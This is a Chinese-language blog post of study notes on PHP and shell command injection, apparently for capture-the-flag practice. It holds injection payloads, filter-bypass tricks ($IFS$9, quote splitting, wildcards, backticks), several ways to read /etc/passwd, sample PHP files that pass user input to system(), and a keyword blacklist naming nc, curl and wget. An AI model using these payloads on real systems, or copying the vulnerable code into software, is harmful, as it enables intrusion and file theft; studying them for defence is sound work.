<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.5.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: '复制',
      copy_success: '复制成功',
      copy_failure: '复制失败'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;Hm6TiLHiAygrJr-MGRq9Mw 最常用的12?cmd&#x3D;system(&#39;whoami&#39;);    一般还是Linux下的环境比较多  命令注入流程![img](6 命令执行&#x2F;clip_image002.jpg) php代码执行函数![image-20200729221604802](6 命令执行&#x2F;image-202007292216">
<meta property="og:type" content="article">
<meta property="og:title" content="命令执行">
<meta property="og:url" content="http://yoursite.com/2019/12/11/6%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="zhiliya">
<meta property="og:description" content="https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;Hm6TiLHiAygrJr-MGRq9Mw 最常用的12?cmd&#x3D;system(&#39;whoami&#39;);    一般还是Linux下的环境比较多  命令注入流程![img](6 命令执行&#x2F;clip_image002.jpg) php代码执行函数![image-20200729221604802](6 命令执行&#x2F;image-202007292216">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190915145314225.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png">
<meta property="og:image" content="https://image.3001.net/images/20180921/1537502861_5ba46e8d4ba6b.png!small">
<meta property="og:image" content="https://image.3001.net/images/20180921/1537502866_5ba46e92406de.png!small">
<meta property="og:image" content="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="og:image" content="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif">
<meta property="article:published_time" content="2019-12-11T06:37:16.000Z">
<meta property="article:modified_time" content="2023-09-22T06:07:47.301Z">
<meta property="article:author" content="zhiliya">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190915145314225.png">

<link rel="canonical" href="http://yoursite.com/2019/12/11/6%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true,
    isPage: false,
    isArchive: false
  };
</script>

  <title>命令执行 | zhiliya</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">zhiliya</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">欢迎访问我的博客</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/6%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          命令执行
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-12-11 14:37:16" itemprop="dateCreated datePublished" datetime="2019-12-11T14:37:16+08:00">2019-12-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-09-22 14:07:47" itemprop="dateModified" datetime="2023-09-22T14:07:47+08:00">2023-09-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw</a></p>
<h1 id="最常用的"><a href="#最常用的" class="headerlink" title="最常用的"></a>最常用的</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(<span class="string">'whoami'</span>);    </span><br><span class="line">一般还是Linux下的环境比较多</span><br></pre></td></tr></table></figure>

<h1 id="命令注入流程"><a href="#命令注入流程" class="headerlink" title="命令注入流程"></a>命令注入流程</h1><p>![img](6 命令执行/clip_image002.jpg)</p>
<h1 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h1><p>![image-20200729221604802](6 命令执行/image-20200729221604802.png)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>等php代码执行函数可以配合php可调用的外部程序的函数，即os系统函数 system</span><br><span class="line"><span class="built_in">eval</span>(system(<span class="string">'whoami'</span>))</span><br><span class="line">?cmd=system(<span class="string">'whoami'</span>);           记住分号别忘了 忘了就执行不了</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">eval</span>(system(<span class="string">'whoami'</span>));</span><br></pre></td></tr></table></figure>

<p>![image-20200729221813255](6 命令执行/image-20200729221813255.png)</p>
<p>![image-20200730085533262](6 命令执行/image-20200730085533262.png)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) </span><br><span class="line">当 pattern为<span class="string">'/xxxxx/e'</span>时，将会把replacement作为php代码执行。</span><br></pre></td></tr></table></figure>

<p>![image-20200730090003482](6 命令执行/image-20200730090003482.png)</p>
<p>![image-20200730090017744](6 命令执行/image-20200730090017744.png)</p>
<h1 id="代码执行漏洞的原因"><a href="#代码执行漏洞的原因" class="headerlink" title="代码执行漏洞的原因"></a>代码执行漏洞的原因</h1><p>![image-20200730085759234](6 命令执行/image-20200730085759234.png)</p>
<h1 id="过滤-fuzz测试"><a href="#过滤-fuzz测试" class="headerlink" title="过滤  fuzz测试"></a>过滤  fuzz测试</h1><p>继续提交一堆参数，看看这个函数究竟过滤了什么。提交<code>http://192.168.12.102/index.php?cmd=/+-()*&lt;&gt;</code>,一堆有的没的，目的就是看这个参数过滤了什么</p>
<p>//‘+-()*&lt;&gt;</p>
<h1 id="各种读文件命令"><a href="#各种读文件命令" class="headerlink" title="各种读文件命令"></a>各种读文件命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat--由第一行开始显示内容，并将所有内容输出                                  行 html源代码页  双份显示</span><br><span class="line">tac--从最后一行倒序显示内容，并将所有内容输出                                  行 html源代码页</span><br><span class="line">more-- 根据窗口大小，一页一页的现实文件内容                                  行 html源代码页  双份显示</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符                                  行 html源代码页 双份显示</span><br><span class="line">head-- 只显示头几行                                     行 html源代码页</span><br><span class="line">tail --只显示最后几行                                   行 html源代码页</span><br><span class="line">nl --类似于cat -n，显示时输出行号                            行 html源代码页</span><br><span class="line">tailf-- 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出   vi<span class="variable">$IFS</span><span class="variable">$9</span>`ls`  还真行 不过要到html源代码页才能看到</span><br><span class="line">sed、sort、uniq、</span><br></pre></td></tr></table></figure>

<h1 id="歪门邪道"><a href="#歪门邪道" class="headerlink" title="歪门邪道"></a>歪门邪道</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /*/*/*flag*   -- 枚举文件和目录</span><br><span class="line">sort /app/class/flag.php -- 从最后一行开始读取文件</span><br><span class="line">find -- 列出当前目录下的文件以及子目录所有文件</span><br><span class="line">&amp;&#123;grep,-nrw,.&#125; -- 递归读取当前目录下的文件以及子目录所有文件</span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line">curl file:///etc/passwd</span><br><span class="line">strings /etc/passwd</span><br><span class="line">uniq -c/etc/passwd</span><br><span class="line">bash -v /etc/passwd</span><br><span class="line">rev /etc/passwd</span><br></pre></td></tr></table></figure>

<h1 id="花括号的别样用法"><a href="#花括号的别样用法" class="headerlink" title="花括号的别样用法"></a>花括号的别样用法</h1><p>在Linux bash中还可以使用<code>{OS_COMMAND,ARGUMENT}</code>来执行系统命令<br><img src="https://img-blog.csdnimg.cn/20190915145314225.png" alt="在这里插入图片描述"></p>
<h1 id="绕过-有回显-用system系统命令"><a href="#绕过-有回显-用system系统命令" class="headerlink" title="绕过  有回显 用system系统命令"></a>绕过  有回显 用system系统命令</h1><h2 id="命令分隔符-且有前缀-需要消除前边的影响"><a href="#命令分隔符-且有前缀-需要消除前边的影响" class="headerlink" title="命令分隔符 且有前缀 需要消除前边的影响"></a>命令分隔符 且有前缀 需要消除前边的影响</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%0a  --  换行符，需要php环境             正则表达式的模式是匹配多行的，可以用 /n 换行符 来跳过正则陪匹配：</span><br><span class="line">%0d  --  回车符，需要php环境</span><br><span class="line">;  --  在 shell 中，担任”连续指令”功能的符号就是”分号”     cmd1；cmd2      先执行cmd1,不管cmd1是否成功，都会执行cmd2。</span><br><span class="line">&amp;  --  不管第一条命令成功与否，都会执行第二条命令</span><br><span class="line">&amp;&amp;  --  第一条命令成功，第二条才会执行</span><br><span class="line">|  --  第一条命令的结果，作为第二条命令的输入</span><br><span class="line">||  --  第一条命令失败，第二条才会执行         先执行cmd1,若cmd1执行成功，输出cmd1的执行结果， 不会执行cmd2。否则执行cmd2。</span><br></pre></td></tr></table></figure>

<p>![image-20200730090244775](6 命令执行/image-20200730090244775.png)</p>
<h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>且有前缀 需要消除前边的影响  使用多条命令执行 </p>
<p>有时候会出现这种代码</p>
<p><strong>cmd2.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"执行的语句:"</span>;</span><br><span class="line">$var=<span class="string">'curl '</span>.$cmd;</span><br><span class="line"><span class="keyword">echo</span> $var;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;执行结果:"</span>;</span><br><span class="line">system($var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以把它理解为curl在线使用吧。?cmd=<a href="http://www.baidu.com,结果如下图" target="_blank" rel="noopener">www.baidu.com,结果如下图</a></p>
<ul>
<li><p>分号;</p>
</li>
<li><p>&amp;,&amp;&amp;,|,||</p>
</li>
<li><p>换行符%0a(php环境)</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个怎么个用法呢，先看这条?cmd&#x3D;%0als  </span><br><span class="line">发现是可以正常执行ls的，那么curl呢？</span><br><span class="line">换行符让curl孤单的成为一条语句，ls成为一条孤独的语句，所以就绕过了curl后边加网址的限制。</span><br></pre></td></tr></table></figure>

<h2 id="命令终结符-存在后缀需要消除后边的影响"><a href="#命令终结符-存在后缀需要消除后边的影响" class="headerlink" title="命令终结符 存在后缀需要消除后边的影响"></a>命令终结符 存在后缀需要消除后边的影响</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>  --  需要php环境</span><br><span class="line">%<span class="number">20</span><span class="comment">#  --  需要php环境</span></span><br></pre></td></tr></table></figure>

<h3 id="例-1"><a href="#例-1" class="headerlink" title="例"></a>例</h3><p>存在后缀需要消除后边的影响</p>
<p><strong>cmd3.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"执行的语句:"</span>;</span><br><span class="line">$var=<span class="string">'curl www.'</span>.$cmd.<span class="string">".com"</span>;</span><br><span class="line"><span class="keyword">echo</span> $var;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;执行结果:"</span>;</span><br><span class="line"><span class="comment">//system($cmd);</span></span><br><span class="line">system($var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这次把后边也堵上了，所以要用到类似于sql注入中#的截断作用的字符。</p>
<ul>
<li>%00(需要php环境)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=;ls%00  </span><br><span class="line">正常执行ls，原来命令时ls.com，加入%00后，.com就没了</span><br></pre></td></tr></table></figure>

<ul>
<li>%20%23  (需要php环境)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=;ls%20%23</span><br></pre></td></tr></table></figure>

<h2 id="空格的过滤"><a href="#空格的过滤" class="headerlink" title="空格的过滤"></a>空格的过滤</h2><h3 id="09-20-php环境下"><a href="#09-20-php环境下" class="headerlink" title="%09 %20(php环境下)"></a>%09 %20(php环境下)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%09  -- (tab) 需要php环境，如cat%09flag.php</span><br><span class="line"></span><br><span class="line">?kg=$<span class="string">'\x20flag.txt'</span>&amp;&amp;cat<span class="variable">$kg</span>  (不需要php环境)</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br><span class="line">&#123;cat flag.txt&#125;</span><br></pre></td></tr></table></figure>

<h3 id="lt-or-gt-or-lt-gt-需要root权限"><a href="#lt-or-gt-or-lt-gt-需要root权限" class="headerlink" title="&lt;or&gt;or&lt;&gt;  需要root权限"></a><code>&lt;or&gt;or&lt;&gt;</code>  需要root权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;  --  重定向，如cat&lt;flag.php</span><br><span class="line">&lt;&gt;  --  重定向，如cat&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="IFS-IFS-9"><a href="#IFS-IFS-9" class="headerlink" title="${IFS}/$IFS$9"></a>${IFS}/$IFS$9</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span>  --  单纯cat<span class="variable">$IFS2</span>,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat<span class="variable">$&#123;IFS2&#125;</span>flag.php</span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span>  --  后面加个$与&#123;&#125;类似，起截断作用，<span class="variable">$9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，如cat<span class="variable">$IFS2</span><span class="variable">$9flag</span>.php  cat<span class="variable">$&#123;IFS&#125;</span><span class="variable">$9flag</span></span><br><span class="line"></span><br><span class="line">这里解释一下<span class="variable">$&#123;IFS&#125;</span>,<span class="variable">$IFS</span>,<span class="variable">$IFS</span><span class="variable">$9</span>的区别，首先<span class="variable">$IFS</span>在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat<span class="variable">$IFS2</span>,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用<span class="variable">$9</span>呢，因为<span class="variable">$9</span>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</span><br></pre></td></tr></table></figure>

<h2 id="黑名单绕过-正则匹配禁用字符-绕过命令语句和文件名"><a href="#黑名单绕过-正则匹配禁用字符-绕过命令语句和文件名" class="headerlink" title="黑名单绕过  正则匹配禁用字符  绕过命令语句和文件名"></a>黑名单绕过  正则匹配禁用字符  绕过命令语句和文件名</h2><p>![image-20200730092713771](6 命令执行/image-20200730092713771.png)</p>
<h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat te\st.php</span><br></pre></td></tr></table></figure>

<h3 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">''</span>t te<span class="string">""</span>st.php</span><br><span class="line">你唯一需要注意的就是闭合，这点很重要，</span><br><span class="line">利用这个我们可以绕过一些匹配字符串的WAF规则。</span><br><span class="line">读取/etc/passwd：</span><br><span class="line">/<span class="string">'b'</span>i<span class="string">'n'</span>/<span class="string">'c'</span>a<span class="string">'t'</span> /<span class="string">'e'</span>t<span class="string">'c'</span>/<span class="string">'p'</span>a<span class="string">'s'</span>s<span class="string">'w'</span>d</span><br></pre></td></tr></table></figure>

<h3 id="连接符截断绕过-反斜杠-单引号，双引号-1-9-利用Shell-特殊变量绕过-a-只能拼接在命令语句和文件名后面-PS2-‘-gt-’-PS4-‘-’"><a href="#连接符截断绕过-反斜杠-单引号，双引号-1-9-利用Shell-特殊变量绕过-a-只能拼接在命令语句和文件名后面-PS2-‘-gt-’-PS4-‘-’" class="headerlink" title="连接符截断绕过  反斜杠    单引号，双引号   $@ $* $1-$9(利用Shell 特殊变量绕过)  $a(只能拼接在命令语句和文件名后面)  ${PS2}  ‘&gt;’ ${PS4}   ‘+’"></a>连接符截断绕过  反斜杠    单引号，双引号   $@ $* $1-$9(利用Shell 特殊变量绕过)  $a(只能拼接在命令语句和文件名后面)  ${PS2}  ‘&gt;’ ${PS4}   ‘+’</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c\at test.txt 反斜杠</span><br><span class="line">c<span class="string">'a'</span>t test.txt</span><br><span class="line">ca<span class="variable">$@t</span> test.txt</span><br><span class="line"><span class="variable">$@</span> $* <span class="variable">$1</span>-<span class="variable">$9</span></span><br><span class="line"></span><br><span class="line">未初始化的变量值都是null</span><br><span class="line">读取/etc/passwd：</span><br><span class="line">cat<span class="variable">$a</span> /etc<span class="variable">$a</span>/passwd<span class="variable">$a</span></span><br><span class="line">cat<span class="variable">$a</span> flag<span class="variable">$a</span>   只能拼接在命令语句和文件名后面</span><br><span class="line"></span><br><span class="line">- <span class="variable">$&#123;PS2&#125;</span> 对应字符 <span class="string">'&gt;'</span></span><br><span class="line">- <span class="variable">$&#123;PS4&#125;</span> 对应字符 <span class="string">'+'</span></span><br></pre></td></tr></table></figure>

<p>![image-20191214173214780](6 命令执行/image-20191214173214780.png)</p>
<h3 id="使用反引号绕过"><a href="#使用反引号绕过" class="headerlink" title="使用反引号绕过"></a>使用反引号绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = [</span><br><span class="line">      <span class="string">'flag'</span>, <span class="string">'cat'</span>, <span class="string">'nc'</span>, <span class="string">'sh'</span>, <span class="string">'cp'</span>, <span class="string">'touch'</span>, <span class="string">'mv'</span>, <span class="string">'rm'</span>, <span class="string">'ps'</span>, <span class="string">'top'</span>, <span class="string">'sleep'</span>, <span class="string">'sed'</span>, <span class="string">'apt'</span>, <span class="string">'yum'</span>, <span class="string">'curl'</span>, <span class="string">'wget'</span>, <span class="string">'perl'</span>,</span><br><span class="line">      <span class="string">'python'</span>, <span class="string">'zip'</span>, <span class="string">'tar'</span>, <span class="string">'php'</span>, <span class="string">'ruby'</span>, <span class="string">'kill'</span>, <span class="string">'passwd'</span>, <span class="string">'shadow'</span>, <span class="string">'root'</span>, <span class="string">'z'</span>,<span class="string">'dir'</span>, <span class="string">'dd'</span>, <span class="string">'df'</span>, <span class="string">'du'</span>, <span class="string">'free'</span>,<span class="string">'tempfile'</span>,</span><br><span class="line">      <span class="string">'touch'</span>, <span class="string">'tee'</span>, <span class="string">'sha'</span>, <span class="string">'x64'</span>, <span class="string">'g'</span>,<span class="string">'xargs'</span>, <span class="string">'PATH'</span>,<span class="string">'$0'</span>, <span class="string">'proc'</span>, <span class="string">'/'</span>, <span class="string">'&amp;'</span>, <span class="string">'|'</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">';'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>, <span class="string">'\\'</span>, <span class="string">"\n"</span></span><br><span class="line">        ];</span><br><span class="line">...(省略部分代码)</span><br><span class="line"><span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $keyword) &#123;</span><br><span class="line">       <span class="keyword">if</span>(strstr($ip, $keyword)) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"&#123;$keyword&#125; not allowed"</span>;</span><br><span class="line">...(省略部分代码)</span><br><span class="line">exec(<span class="string">"ping -c 1 \"&#123;$ip&#125;\" 2&gt;&amp;1"</span>, $ret);</span><br></pre></td></tr></table></figure>

<p>绕过：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=`tac fla*`</span><br></pre></td></tr></table></figure>

<h4 id="特殊-要记住"><a href="#特殊-要记住" class="headerlink" title="特殊 要记住"></a>特殊 要记住</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat `ls`   反引号会首先执行ls  再与cat拼接</span><br></pre></td></tr></table></figure>

<h3 id="通配符-，？与斜杠组合绕过-针对文件名的绕过"><a href="#通配符-，？与斜杠组合绕过-针对文件名的绕过" class="headerlink" title="通配符*，？与斜杠组合绕过  针对文件名的绕过"></a>通配符<code>*</code>，<code>？</code>与斜杠组合绕过  针对文件名的绕过</h3><p>![image-20200730095152454](6 命令执行/image-20200730095152454.png)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh = /b?n/?h</span><br><span class="line"></span><br><span class="line">在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</span><br><span class="line">*    代表『 0 个到无穷多个』任意字符</span><br><span class="line">?    代表『一定有一个』任意字符</span><br><span class="line">[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』</span><br><span class="line">[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！</span><br><span class="line">[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</span><br></pre></td></tr></table></figure>

<p>![image-20200730094519608](6 命令执行/image-20200730094519608.png)</p>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>内联执行</p>
<ul>
<li>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。</li>
</ul>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> “a`<span class="built_in">pwd</span>`”</span><br></pre></td></tr></table></figure>

<ul>
<li>于此类似的还有$(command)</li>
</ul>
<p>例如：echo “abcd $(pwd)”</p>
